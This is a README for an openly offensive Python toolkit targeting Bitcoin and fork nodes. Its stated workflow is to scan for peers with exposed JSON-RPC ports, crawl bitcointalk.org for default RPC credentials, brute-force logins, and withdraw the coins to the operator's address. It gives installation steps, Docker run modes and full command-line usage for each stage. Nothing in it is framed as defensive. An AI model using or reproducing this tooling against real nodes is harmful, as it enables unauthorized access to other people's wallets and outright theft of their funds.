# pyshella-toolkit

[![Python 3.7](https://img.shields.io/badge/python-3.7-blue.svg)](https://www.python.org/downloads/release/python-370/)
![Platform](https://img.shields.io/badge/platform-linux-green.svg)
[![GitHub license](https://img.shields.io/github/license/Naereen/StrapDown.js.svg)](https://github.com/Naereen/StrapDown.js/blob/master/LICENSE)

This is simple toolkit for Bitcoin or Bitcoin forks , which contains
cli scripts such as `peers-scanner`, `jsonrpc-searcher`, 
`jsonrpc-bruter`, `coins-withdrawal`. 

This set of scripts allows you to find peers with the JSON-RPC
port open to the outside, followed by a bruteforce attack
and withdrawal the coins.

**Donate me if you like it:**
```
bitcoin -> bc1qqkr72aemz59aawxf74gytrwuw4m9mj20t7e7df
ethereum -> 0xB3e5b643cFB9e2565a3456eC7c7A73491A32e31F
```

## **Getting started**
* [Installation](#installation)
* [Configuring MongoDB](#configuring-mongodb)
    * [Installing](#installing-mongodb)
    * [Enable auth](#enable-auth)
    * [Run](#run-mongod)
* [Docker supporting](#docker-supporting)
* Toolkit
    * [Peers-scanner](#peers-scanner)
    * [JSON-RPC Searcher](#json-rpc-searcher)
    * [JSON-RPC Bruter](#json-rpc-bruter)
    * [Coins-withdrawal](#coins-withdrawal)



## Installation
```bash
mkdir -p ~/pyshella-toolkit/wordlists && mkdir ~/pyshella-toolkit/logs
git clone https://github.com/mkbeh/pyshella-toolkit
cd pyshella-toolkit/
pip3.7 install wheel
python3.7 setup.py bdist_egg --exclude-source-files
python3.7 -m easy_install --install-dir ~/.local/lib/python3.7/site-packages --prefix=$HOME/.local dist/<package>

# NOTE: if error - try previously (setup yours path)
export PYTHONPATH=~/.local/lib/python3.7/site-packages
```

## Configuring MongoDB

### Installing MongoDB
```bash
sudo apt-key adv --keyserver hkp://keyserver.ubuntu.com:80 --recv 9DA31620334BD75D9DCB49F368818C72E52529D4
echo "deb [ arch=amd64 ] https://repo.mongodb.org/apt/ubuntu bionic/mongodb-org/4.0 multiverse" | sudo tee /etc/apt/sources.list.d/mongodb-org-4.0.list
sudo apt-get update
sudo apt-get install -y mongodb-org
mkdir -p /data/db

echo "mongodb-org hold" | sudo dpkg --set-selections
echo "mongodb-org-server hold" | sudo dpkg --set-selections
echo "mongodb-org-shell hold" | sudo dpkg --set-selections
echo "mongodb-org-mongos hold" | sudo dpkg --set-selections
echo "mongodb-org-tools hold" | sudo dpkg --set-selections
```

### Enable auth
```
# Start MongoDB
mongod

# Connect to the instance
mongo

# Use database
use admin

# Create the user administrator
db.createUser({user: "admin", pwd: "admin", roles: ["root"]})

# Re-start the MongoDB instance with access control
db.adminCommand({ shutdown: 1})

# Exit from mongo cli
exit
```

### Run mongod
```bash
# -- Run mongo daemon --
mongod --auth -f /etc/mongod.conf

# -- Check connection --
mongo --host <ip:20777> -u "admin" --authenticationDatabase "admin" -p

```

## Docker supporting
```bash
git clone https://github.com/mkbeh/pyshella-toolkit
cd pyshella-toolkit/
chmod +x toolkit.sh
mkdir -p ~/pyshella-toolkit

# Set your data to the sections `program` in `toolkit.conf`. 
vi toolkit.conf

        --- IMPORTANT NOTE ---
# if you do not want to run a spider - 
# add your dictionaries to the directory 
# ~/pyshella-toolkit/wordlists on host. 
# This directory is shared between the host 
# and the container.

# Next build docker image.
docker build -t pyshella-toolkit:0.56.30 .
```

**Available modes to launch the container:**
* **DEBUG** - the running container will output data 
from the log file in real time for all utilities from 
the toolkit with errors and success data.
* **BATTLE** - without output data from the log file
in real time.

**Crawler modes:**
* **ACTIVATE** - will activate crawler , which will
crawl bitcointalk.org ANN section for searching default
credentials , then created 2 files with RPC users and 
RPC passwords.
* **INACTIVATE** - will use dictionaries from 
`toolkit.conf`.

```bash
# -- Docker run examples for each supporting mode --

# -- DEBUG:
docker run --name <coin_name> -v ~/pyshella-toolkit:/pyshella-toolkit -e "ENV=DEBUG" --network host pyshella-toolkit:<version>

# -- BATTLE:
docker run -itd --name <coin_name> -v ~/pyshella-toolkit:/pyshella-toolkit -e "ENV=BATTLE" --network host pyshella-toolkit:<version>

# EDIT THIS
docker run -v ~/pyshella-toolkit:/pyshella-toolkit/shared -e "ENV=DEBUG" -e "CRAWLER=ACTIVATE" --network host pyshella-toolkit:<version>


# -- NOTE --
If your database is on a remote host, then 
option `--network` with value `host` can be omitted.
```

> File with log are located by host path ~/pyshella-toolkit/logs/

## Bitcointalk default credentials crawler
Crawler which searching default rpc credentials in
each topic of section ANN.

```
Important note: This process may take more than a few 
hours, please be patient. 
```

### How to use
```bash
cd btt_spider
scrapy crawl creds_crawler
```


## Peers Scanner
The `peers scanner` scans the network for available peers and 
writes them to a file. For new peers, old ones are blacklisted.

### How to use
```
usage: pyshella-peers-scanner [-h] -nU  [-b] [-i] -mU   -n

optional arguments:
  -h, --help            show this help message and exit
  -nU , --node-uri      Node URI.
  -b , --ban-time       The time(days) which will be banned each peer (by
                        default 14 days).
  -i , --interval       Interval(secs) between call cycles for new peers (by
                        default 60 secs).
  -mU  , --mongo-uri    MongoDB uri.
  -n  , --coin-name     Name of cryptocurrency.

-----------------------------------------------------------------------------
Usage example: pyshella-peers-scanner -nU <node_uri> -mU <mongo_uri> -n <coin_name>
```

## JSON-RPC Searcher
Scanner which discovers Bitcoin/forks JSON-RPC on peers.

### How to use
```
usage: pyshella-jsonrpc-searcher [-h] -n NAME [-mU URI] [-cT SECS] [-rT SECS]
                                 [-bT SECS] [-hS NUM] [-pS NUM] [-v BOOL]

optional arguments:
  -h, --help            show this help message and exit
  -n NAME, --coin-name NAME
                        Name of cryptocurrency.
  -mU URI, --mongo-uri URI
                        MongoDB URI. Default:
                        mongodb://root:toor@localhost:27017
  -cT SECS              Timeout between hosts block cycles.
  -rT SECS              Time to wait for a response from the server after
                        sending the request.
  -bT SECS              Delay between block cycles.
  -hS NUM               The number of hosts that will be processed
                        simultaneously.
  -pS NUM               The number of ports that will be processed
                        simultaneously for each host.
  -v BOOL               Activate verbose mode. Will show all found headers.

-----------------------------------------------------
Usage example: pyshella-jsonrpc-searcher -n Bitcoin -bT 1 -hS 1 -pS 200 -v True
```


## JSON-RPC Bruter
Bitcoin/fork JSON-RPC bruter. Based on asyncio.

### How to use
```
usage: pyshella-jsonrpc-bruter [-h] -n NAME [-mU URI] -l SINGLE/FILE -p
                               SINGLE/FILE [-b ORDER] [-t NUM] [-rT SECS]
                               [-cT SECS]
optional arguments:
  -h, --help            show this help message and exit
  -n NAME, --coin-name NAME
                        Name of cryptocurrency.
  -mU URI, --mongo-uri URI
                        MongoDB URI. Default:
                        mongodb://root:toor@localhost:27017
  -l SINGLE/FILE, --logins SINGLE/FILE
                        Single login or file with logins.
  -p SINGLE/FILE, --passwords SINGLE/FILE
                        Single password or file with passwords.
  -b ORDER, --brute-order ORDER
                        The order in which the brute force process will occur.
                        Where H - hosts, L - logins, P - passwords. Default:
                        HLP. Examples: HLP, LPH, PHL, etc.
  -t NUM, --threads NUM
                        The number of coroutines that will be asynchronous in
                        bruteforce process.
  -rT SECS, --read-timeout SECS
                        Time to wait for a response from the server after
                        sending the request.
  -cT SECS, --cycle-timeout SECS
                        Timeout between getting new data for brute.

----------------------------------------------------------------------------------------------
Usage example:
-> pyshella-jsonrpc-bruter --help
-> pyshella-jsonrpc-bruter -n Bitcoin -t 20 -l <logins_file> -p <pwds_file> -b HLP
```


## Coins Withdrawal
Utility which withdrawal crypto currency from bruted JSON-RPC.

### How to use
```
usage: pyshella-coins-withdrawal [-h] -n NAME -mU URI -a ADDR [-i SECS]

optional arguments:
  -h, --help            show this help message and exit
  -n NAME, --coin-name NAME
                        Name of cryptocurrency.
  -mU URI, --mongo-uri URI
                        MongoDB uri.
  -a ADDR, --withdrawal-address ADDR
                        The address to which the coins will be sent.
  -i SECS, --interval SECS
                        Timeout after coins withdrawal from all the peers that
                        were collected in the database at the moment.

-----------------------------------------------------------------------------------------------------------------------
Usage example: pyshella-coins-withdrawal -n Bitcoin -mU mongodb://root:toor@localhost:27017 -a <withdrawal_addr> -i 300
```
